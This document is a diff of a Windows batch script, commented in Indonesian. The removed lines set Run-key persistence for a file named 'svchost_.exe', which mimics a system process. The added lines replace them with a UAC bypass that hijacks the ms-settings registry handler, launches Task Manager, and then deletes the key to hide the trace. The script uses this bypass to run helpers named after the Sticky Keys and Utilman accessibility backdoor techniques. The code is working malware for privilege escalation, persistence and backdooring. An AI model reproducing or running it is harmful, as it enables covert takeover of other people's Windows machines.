@@ -1,19 +1,32 @@
 @echo off
 :: ---------------------------
-:: Tambahkan svchost_.exe ke startup registry (user login)
-:: ---------------------------
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v XMASTERTES /t REG_SZ /d "C:\ProgramData\AppData\XMASTERTES-main\svchost_.exe" /f
-
-:: ---------------------------
-:: Jalankan file BAT dan EXE dengan hak administrator
+:: Set current directory
 :: ---------------------------
 set "currentDir=%~dp0"
 
-:: Jalankan ExecuteStickyKeys.bat
-powershell -Command "Start-Process '%currentDir%ExecuteStickyKeys.bat' -Verb RunAs"
+:: ---------------------------
+:: Bypass UAC via Task Manager - ExecuteStickyKeys.bat
+:: ---------------------------
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteStickyKeys.bat"
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
+start "" "C:\Windows\System32\Taskmgr.exe"
+timeout /t 5 >nul
+REG DELETE "HKCU\Software\Classes\ms-settings" /f
 
-:: Jalankan ExecuteUtilman.bat
-powershell -Command "Start-Process '%currentDir%ExecuteUtilman.bat' -Verb RunAs"
+:: ---------------------------
+:: Bypass UAC via Task Manager - ExecuteUtilman.bat
+:: ---------------------------
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteUtilman.bat"
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
+start "" "C:\Windows\System32\Taskmgr.exe"
+timeout /t 5 >nul
+REG DELETE "HKCU\Software\Classes\ms-settings" /f
 
-:: Jalankan svchost_.exe
-powershell -Command "Start-Process '%currentDir%svchost_.exe' -Verb RunAs"
+:: ---------------------------
+:: Bypass UAC via Task Manager - svchost_.exe
+:: ---------------------------
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%svchost_.exe"
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
+start "" "C:\Windows\System32\Taskmgr.exe"
+timeout /t 5 >nul
+REG DELETE "HKCU\Software\Classes\ms-settings" /f
